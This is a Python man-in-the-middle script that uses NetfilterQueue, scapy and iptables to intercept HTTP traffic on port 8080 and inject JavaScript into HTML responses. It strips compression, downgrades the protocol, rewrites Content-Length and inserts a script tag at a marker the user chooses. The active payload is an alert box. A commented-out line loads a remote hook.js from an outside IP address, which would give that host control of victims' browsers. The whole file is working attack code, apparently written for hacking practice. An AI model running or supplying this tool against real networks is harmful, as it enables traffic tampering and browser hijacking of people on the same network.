#!/usr/bin/env python

# Dependencies needed to manage netfilterqueue build-essential python<version>-dev libnetfilter-queue-dev
# After installing libnetfilter-queue-dev do not execute apt autoremove will break dependencies.
# Install module netfilterqueue as sudo
from netfilterqueue import NetfilterQueue
import argparse
import subprocess
import re
import logging
import scapy.all as scapy


ack_list_request = []
ack_list_response = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def inject_code(load, code_inject, inject_in_f):
    return load.replace(inject_in_f, code_inject + inject_in_f)


#  def looking_cont_len():



def process_packet(packet):
    code_inject = "<script>alert('Hello hacking world');</script>"
    # code_inject = '<script src="http://192.168.180.120:3000/hook.js"></script>'
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):  # DNS response
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 8080:
                if (url_target in load) if url_target else True:
                    print("[+] HTTP Request")
                    ack_list_request.append(scapy_packet[scapy.TCP].ack) if url_target else False
                    load = re.sub(r'Accept-Encoding:.*?\\r\\n', "", load)  # load becomes String
                    load = load.replace("HTTP/1.1", "HTTP/1.0")
            elif scapy_packet[scapy.TCP].sport == 8080:
                print("[+] HTTP Response")
                if (scapy_packet[scapy.TCP].seq in ack_list_request) if url_target else True:
                    ack_list_response.append(scapy_packet[scapy.TCP].ack) if url_target else False
                    content_length = re.search('(?:Content-Length:\s)(\d*)', load)
                    # print(load)
                    if content_length and "text/html" in load:
                        content_length = content_length.group(1)
                        new_cont_len = int(content_length) + len(code_inject)
                        # print(new_cont_len)
                        load = load.replace(content_length, str(new_cont_len))
                    if not url_target:
                        load = inject_code(load, code_inject, inject_in)  # Injecting the code
                elif scapy_packet[scapy.TCP].ack in ack_list_response:
                        load = inject_code(load, code_inject, inject_in)  # Injecting the code
            if load != scapy_packet[scapy.Raw].load.decode():
                packet.set_payload(bytes(set_load(scapy_packet, load)))
        except (UnicodeDecodeError, IndexError) as ie:
            # IndexError is when it is called TCP, although the first calls doesn't have that parameters
            # so, the code just jump to accept the packets without any required management.
            # UnicodeDecodeError is risen when the code tries to convert binary to string
            # using decode() function. Thera ara some characters which decode() is not able to transform.
            # UnicodeDecodeError happens with some packets, those packets which no need though.
            # logging.exception(ie)
            pass

    # print(scapy_packet.show())  # Return the packet's payload as a byte object to see the packets.
    packet.accept()  # If it is accepted, it will be forwarded.


def setting_iptables(option, chain):
    subprocess.run(['iptables', option, chain, '-j', 'NFQUEUE', '--queue-num', '0'])
    iptables_output = subprocess.run(['iptables', '-S'], capture_output=True).stdout.decode()
    # print(iptables_output)
    print(chain + " -j NFQUEUE --queue-num 0" in iptables_output and "Ok\r" or "Erased", end='\n')


def chain_setting(chain_iptables_to_set, remove):
    if chain_iptables_to_set in "forward" and not remove:
        print('Inserting ' + chain_iptables_to_set + ' chain -> ', end='')
        setting_iptables('-I', "FORWARD")
    elif chain_iptables_to_set in "io" and not remove:
        print('Inserting OUTPUT chain -> ', end='')
        setting_iptables('-I', 'OUTPUT')
        print('Inserting INPUT chain -> ', end='')
        setting_iptables('-I', 'INPUT')
    elif remove:
        if chain_iptables_to_set in "forward":
            print('\rRemoved ' + chain_iptables_to_set + ' chain -> ', end='')
            setting_iptables('-D', "FORWARD")
        elif chain_iptables_to_set in "io":
            print('\rRemoved OUTPUT chain -> ', end='')
            setting_iptables('-D', 'OUTPUT')
            print('\rRemoved INPUT chain -> ', end='')
            setting_iptables('-D', 'INPUT')


arguments = argparse.ArgumentParser(description="Intercepting file - HTTP only")
arguments.add_argument('-c', '--iptables-chain', dest='chain_iptables', help='IPTABLES as forward or io (Input/Output)')
arguments.add_argument('-url', '--url-target', dest='url_target', help='The url target')
arguments.add_argument('-inj', '--inject-in', dest='inject_in', help='Place to inject the code. Be careful, it must '
                                                                     'be a unique place. The arg must be between \'')

chain_iptables = arguments.parse_args().chain_iptables
url_target = arguments.parse_args().url_target
inject_in = arguments.parse_args().inject_in


netQueue = NetfilterQueue()
try:
    netQueue.bind(0, process_packet)
    chain_setting(chain_iptables, False)
    netQueue.run()
except KeyboardInterrupt:
    chain_setting(chain_iptables, True)
except BaseException as e:
    logging.exception(e)
    print("\nError has come up ... quiting", end='\n\n')
    chain_setting(chain_iptables, True)


netQueue.unbind()
